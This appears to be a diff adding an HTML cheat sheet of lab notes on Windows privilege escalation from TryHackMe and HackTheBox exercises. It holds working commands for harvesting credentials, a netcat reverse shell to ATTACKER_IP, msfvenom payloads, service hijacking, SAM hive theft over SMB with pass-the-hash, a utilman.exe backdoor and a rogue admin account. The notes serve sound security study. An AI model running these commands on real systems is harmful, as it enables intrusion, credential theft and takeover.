@@ -1,0 +1,109 @@
+<h3 name="56bf"><span style="font-size: 24px; color: rgb(41, 105, 176);">Windows Priv Esc</span></h3>
+<p name="0986"><span style="font-size: 24px;">Thank you to both TryHackMe and HackTheBox</span></p>
+<p name="0986"><br></p>
+<h3 name="8475"><span style="font-size: 24px; background-color: rgb(251, 160, 38);">Initial</span></h3>
+<p name="5cca"><span style="font-size: 24px;">1. systeminfo =such as build number installed patches etc<br>2. wmic qfe get Caption, Description = how quick are systems being patched and updated<br>3. netstart &mdash; install of and started win services ( very long though)<br>4. wmic product get name,version,vendor &mdash; alternative to above but just for app</span></p>
+<p name="7373"><span style="font-size: 24px;">5. whoami /priv &mdash; your privs!<br>6. whoami /groups &mdash; what group you belong too<br>7. net user &mdash; other users<br>8. net group / net localgroup &mdash; avaialble groups<br>9. net localgroup administrators &mdash; listing users belonging to specific group<br>10. net accounts &mdash; see local settings on a machine<br>11. net accounts /domain &mdash; if machine belongs to a domain &mdash; learn about pw policy etc<br>12. ipconfig &mdash; ipconfig /all &mdash; learn about system network config &mdash; /all for dns servers<br>13. netstat -abno<br>14. arp -a &mdash; discover other systems on the same LAN</span></p>
+<p name="71bb"><span style="font-size: 24px;"> &mdash; &mdash; &mdash; &mdash; &mdash; &mdash; &mdash; &mdash; &mdash; &mdash; &mdash; &mdash; &mdash; &mdash; &mdash; &mdash; &mdash; &mdash; &mdash; &mdash; &mdash; &mdash; &mdash; &mdash; &mdash; &mdash; &mdash; &mdash; &mdash; &mdash; &mdash; &mdash; </span></p>
+<h3 name="0e07"><span style="font-size: 24px; background-color: rgb(226, 80, 65);">unattended windows installs: &mdash; may find credentials</span></h3>
+<p name="5342"><span style="font-size: 24px;">C:\Unattend.xml<br>C:\Windows\Panther\Unattend.xml<br>C:\Windows\Panther\Unattend\Unattend.xml<br>C:\Windows\system32\sysprep.inf<br>C:\Windows\system32\sysprep\sysprep.xml</span></p>
+<h3 name="57aa"><span style="font-size: 24px; background-color: rgb(147, 101, 184);">Powershell History</span></h3>
+<p name="53f3"><span style="font-size: 24px;">from cmd: type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt<br>from powershell: type $Env:userprofile\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt</span></p>
+<p name="53f3"><br></p>
+<h3 name="4843"><span style="font-size: 24px; background-color: rgb(163, 143, 132);">Saved windows creds:</span></h3>
+<h3 name="4843"><span style="font-size: 24px;"><br>cmdkey /list<br>runas /savedcred /user:admin cmd.exe</span></h3>
+<p><br></p>
+<h3 name="a0bd"><span style="font-size: 24px;"><strong><span style="background-color: rgb(0, 168, 133);">IIS Configuration&nbsp;</span></strong></span></h3>
+<p name="4f66"><span style="font-size: 24px;"><strong>- web.config &mdash; IIS config</strong></span></p>
+<p name="2134"><span style="font-size: 24px;">Location where we can find:<br>C:\inetpub\wwwroot\web.config<br>C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config</span></p>
+<p name="7ece"><span style="font-size: 24px;">find database connection strings:<br>type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString</span></p>
+<p name="43ec"><span style="font-size: 24px;">Retrive Creds from software: PuTTY<br>reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f &ldquo;Proxy&rdquo; /s</span></p>
+<p name="43ec"><br></p>
+<h3 name="443f"><span style="font-size: 24px; background-color: rgb(44, 130, 201);">Scheduled Tasks</span></h3>
+<p name="05a5"><span style="font-size: 24px;"><br>schtasks&nbsp;<br>schtasks /query /tn vulntask /fo list /v<br>icacls c:\tasks\schtask.bat &mdash; to check file permissions- (F) = full perms (M)=modify</span></p>
+<p name="6360"><span style="font-size: 24px;">editing a file with our payload<br>echo c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 4444 &gt; C:\tasks\schtask.bat</span></p>
+<p name="6360"><br></p>
+<h3 name="21f8"><span style="font-size: 24px; background-color: rgb(250, 197, 28);">AlwaysinstallElevated</span></h3>
+<p name="93b6"><span style="font-size: 24px;"><br>.msi = windows installer files<br>can be configured to run with higher priv from any user even unpriv accounts.</span></p>
+<p name="546e"><span style="font-size: 24px;">we need to set the following two registery values:<br>C:\&gt; reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer<br>C:\&gt; reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer</span></p>
+<p name="b440"><span style="font-size: 24px;">generate a msfvenom shell<br>msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKING_10.10.207.163 LPORT=LOCAL_PORT -f msi -o malicious.msi</span></p>
+<p name="39e8"><span style="font-size: 24px;">transfers file over and run as&nbsp;<br>msiexec /quiet /qn /i C:\Windows\Temp\malicious.msi</span></p>
+<p name="34d4"><span style="font-size: 24px;"> &mdash; &mdash; &mdash; &mdash; &mdash; &mdash; &mdash; &mdash; &mdash; &mdash; &mdash; &mdash; &mdash; &mdash; &mdash; &mdash; &mdash; &mdash; &mdash; &mdash; &mdash; &mdash; &mdash; &mdash; &mdash; &mdash; &mdash; &mdash; &mdash; &mdash; &mdash; </span></p>
+<p name="d338" style="text-align: center;"><span style="font-size: 24px;"><em><strong><u>ABUSING SERVICE MISCONFIGURATIONS</u></strong></em></span></p>
+<p name="d338" style="text-align: center;"><br></p>
+<h3 name="dd39"><span style="font-size: 24px; background-color: rgb(251, 160, 38);">Insecure Permissions on Service Executable</span></h3>
+<p name="04ef"><span style="font-size: 24px;"><strong>- managed by Service Control Manager (SCM)</strong></span></p>
+<p name="2997"><span style="font-size: 24px;">sc qc<br>sc qc apphostsvc</span></p>
+<p name="4f48"><span style="font-size: 24px;">Insecure Permissions on service executable<br>sc qc WindowsScheduler</span></p>
+<p name="6674"><span style="font-size: 24px;">- look at the binary path that is the executable<br>icacls C:\PROGRA~2\SYSTEM~1\WService.exe</span></p>
+<p name="82f7"><span style="font-size: 24px;">- on your kali machine create a reverse shell and use python server to host</span></p>
+<p name="e2dd"><span style="font-size: 24px;">- back on victim machine<br>cd to the directory of binary path from above: C:\PROGRA~2\SYSTEM~1<br>move file: move Wservice.exe Wservice.exe.bkp<br>move C:\Users\rev-svc.exe WService.exe<br>give perm: icalcs Wservice.exe /grant Everyone:F</span></p>
+<p name="06d6"><span style="font-size: 24px;">- setup reverse listener</span></p>
+<p name="b25f"><span style="font-size: 24px;">- restart the services<br>C:\&gt; sc stop windowsscheduler<br>C:\&gt; sc start windowsscheduler</span></p>
+<p name="9e20"><span style="font-size: 24px;">NOTE: PowerShell has <code>sc</code> as an alias to <code>Set-Content</code></span></p>
+<p name="9e20"><br></p>
+<h3 name="9b68"><span style="font-size: 24px; background-color: rgb(184, 49, 47);">Unquoted Service Paths</span></h3>
+<p name="8a76"><span style="font-size: 24px;"><br>sc qc &ldquo;vncserver&rdquo;</span></p>
+<p name="3838"><span style="font-size: 24px;">- is there spaces in associated binary folder? &mdash; as the SCM wont know which binaries to execute<br>- is the location of the file outside of Program files / program files (x86)</span></p>
+<p name="9849"><span style="font-size: 24px;">- create a exectuable on your box and http server<br>&nbsp;msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4446 -f exe-service -o rev-svc2.exe</span></p>
+<ul>
+    <li name="34f0" style="font-size: 24px;">download to victim machine and set up listener on attacker<br>- sc stop and start the binary (as per the output)</li>
+</ul>
+<p><br></p>
+<h3 name="138d"><span style="font-size: 24px; background-color: rgb(84, 172, 210);">Insecure Service Permissions</span></h3>
+<p name="9a43"><span style="font-size: 24px;">from tool: AccessChk</span></p>
+<p name="4689"><span style="font-size: 24px;">C:\tools\AccessChk&gt; accesschk64.exe -qlc thmservice</span></p>
+<p name="48f6"><span style="font-size: 24px;">look at the BUILTIN\\Users group -<br>SERVICE_ALL_ACCESS</span></p>
+<p name="a22d"><span style="font-size: 24px;">- create reverse shell exe<br>- download to victim&nbsp;<br>-set up listener on attack machine</span></p>
+<p name="dd84"><span style="font-size: 24px;">- use icacls to change perms<br>C:\&gt; icacls C:\Users\thm-unpriv\rev-svc3.exe /grant Everyone:F</span></p>
+<p name="3965"><span style="font-size: 24px;">-change the services associated executable and account<br>C:\&gt; sc config THMService binPath= &ldquo;C:\Users\thm-unpriv\rev-svc3.exe&rdquo; obj= LocalSystem</span></p>
+<ul>
+    <li name="527e" style="font-size: 24px;">stop start the service<br>C:\&gt; sc stop THMService<br>C:\&gt; sc start THMService</li>
+</ul>
+<p name="2cad"><span style="font-size: 24px;"> &mdash; &mdash; &mdash; &mdash; &mdash; &mdash; &mdash; &mdash; &mdash; &mdash; &mdash; &mdash; &mdash; &mdash; &mdash; &mdash; &mdash; &mdash; &mdash; &mdash; &mdash; &mdash; &mdash; &mdash; &mdash; &mdash; &mdash; &mdash; &mdash; &mdash; &mdash; &mdash;</span></p>
+<p name="ba58" style="text-align: center;"><span style="font-size: 24px;"><em><strong><u>ABUSING DANGEROUS PRIVILEGES</u></strong></em></span></p>
+<ul>
+    <li name="a77c" style="font-size: 24px;">website: <a href="https://github.com/gtworek/Priv2Admin" rel="nofollow noopener" target="_blank">https://github.com/gtworek/Priv2Admin</a></li>
+</ul>
+<h3 name="bfd6"><span style="font-size: 24px; background-color: rgb(85, 57, 130); color: rgb(255, 255, 255);">SeBackup / SeRestore</span></h3>
+<p name="7022"><span style="font-size: 24px;"><br>whoami /priv</span></p>
+<p name="a7e1"><span style="font-size: 24px;">-backup the SAM and System hashes<br>reg save hklm\system C:\Users\THMBackup\system.hive</span></p>
+<p name="bc14"><span style="font-size: 24px;">reg save hklm\sam C:\Users\THMBackup\sam.hive</span></p>
+<p name="5d3c"><span style="font-size: 24px;">-on attacking machine<br>mkdir share<br>python3.9 /opt/impacket/examples/smbserver.py -smb2support -username THMBackup -password CopyMaster555 public share</span></p>
+<p name="887c"><span style="font-size: 24px;">-copy the files over</span></p>
+<p name="83bc"><span style="font-size: 24px;">C:\&gt; copy C:\Users\THMBackup\sam.hive \\ATTACKER_IP\public\<br>C:\&gt; copy C:\Users\THMBackup\system.hive \\ATTACKER_IP\public\</span></p>
+<p name="f02c"><span style="font-size: 24px;">- crack it using secretsdump.py<br>python3.9 /opt/impacket/examples/secretsdump.py -sam sam.hive -system system.hive LOCAL</span></p>
+<ul>
+    <li name="80c2" style="font-size: 24px;">then use it to passthehash as admin<br>python3.9 /opt/impacket/examples/psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:13a04cdcf3f7ec41264e568127c5ca94 administrator@10.10.66.157</li>
+</ul>
+<h3 name="20eb"><span style="font-size: 24px; background-color: rgb(250, 197, 28);">SeTakeOwnership</span></h3>
+<p name="da6b"><span style="font-size: 24px;">Abusing utilman.exe</span></p>
+<p name="9997"><span style="font-size: 24px;">- first take ownership<br>takeown /f C:\Windows\System32\Utilman.exe</span></p>
+<p name="9daa"><span style="font-size: 24px;">- give yourself full perms<br>icacls C:\Windows\System32\Utilman.exe /grant THMTakeOwnership:F</span></p>
+<p name="870b"><span style="font-size: 24px;">- replace utilman.exe with copy of cmd.exe<br>copy cmd.exe utilman.exe</span></p>
+<p name="1926"><span style="font-size: 24px;">- first go to start and lock your screen</span></p>
+<ul>
+    <li name="3564" style="font-size: 24px;">finally click on &ldquo;ease of access&rdquo; button on lock screen which run utilman.exe with sys priv&nbsp;<br>now we have esc priv</li>
+</ul>
+<h3 name="6cd2"><span style="font-size: 24px; color: rgb(0, 0, 0); background-color: rgb(65, 168, 95);">SeImpersonate / SeAssignPrimaryToken</span></h3>
+<ul>
+    <li name="8b8a" style="font-size: 24px;">needs updating</li>
+</ul>
+<p name="6164"><span style="font-size: 24px;"> &mdash; &mdash; &mdash; &mdash; &mdash; &mdash; &mdash; &mdash; &mdash; &mdash; &mdash; &mdash; &mdash; &mdash; &mdash; &mdash; &mdash; &mdash; &mdash; &mdash; &mdash; &mdash; &mdash; &mdash; &mdash; &mdash; &mdash; &mdash; &mdash; &mdash; &mdash; &mdash;</span></p>
+<p name="d8b9" style="text-align: center;"><span style="font-size: 24px;"><em><strong><u>ABUSING VULNERABLE SOFTWARE</u></strong></em></span></p>
+<h3 name="53cf"><span style="font-size: 24px; background-color: rgb(147, 101, 184);">Unpatched Software</span></h3>
+<p name="f895"><span style="font-size: 24px;">wmic product get name,version,vendor</span></p>
+<p name="335d"><span style="font-size: 24px;">-exploiting druva case study &mdash; more detailed in HTB Academy<br><a href="https://packetstormsecurity.com/files/160404/Druva-inSync-Windows-Client-6.6.3-Privilege-Escalation.html" rel="nofollow noopener" target="_blank">https://packetstormsecurity.com/files/160404/Druva-inSync-Windows-Client-6.6.3-Privilege-Escalation.html</a></span></p>
+<p name="0fe7"><span style="font-size: 24px;">- create user called pwnd and all to admin group<br>- change the &ldquo;cmd&rdquo; in the payload text</span></p>
+<p name="3c6e"><span style="font-size: 24px;">net user pwnd SimplePass123 /add &amp; net localgroup administrators pwnd /add</span></p>
+<p name="ba7b"><span style="font-size: 24px;">-paste the script directly into powershell</span></p>
+<ul>
+    <li name="dc84" style="font-size: 24px;">then run the CMD as administrator (selected the pwnd account from more choice)</li>
+</ul>
+<p name="7d5e"><span style="font-size: 24px;"> &mdash; &mdash; &mdash; &mdash; &mdash; &mdash; &mdash; &mdash; &mdash; &mdash; &mdash; &mdash; &mdash; &mdash; &mdash; &mdash; &mdash; &mdash; &mdash; &mdash; &mdash; &mdash; &mdash; &mdash; &mdash; &mdash; &mdash; &mdash; &mdash; &mdash; &mdash; &mdash;</span></p>
+<h3 name="cddd"><span style="font-size: 24px;">Tools</span></h3>
+<p name="81e9"><span style="font-size: 24px;"><br></span></p>
+<p name="f94f"><span style="font-size: 24px;">Winpeas : <a href="https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS" rel="nofollow noopener" target="_blank">https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS</a></span></p>
+<p name="006d"><span style="font-size: 24px;">PrivescCheck : <a href="https://github.com/itm4n/PrivescCheck" rel="nofollow noopener" target="_blank">https://github.com/itm4n/PrivescCheck</a></span></p>
+<p name="4ba3"><span style="font-size: 24px;">WES-NG: Windows Exploit Suggester : <a href="https://github.com/bitsadmin/wesng" rel="nofollow noopener" target="_blank">https://github.com/bitsadmin/wesng</a></span></p>
+<p name="610e"><span style="font-size: 24px;">Metasploit : multi/recon/local_exploit_suggester (f you already have shell)</span></p>
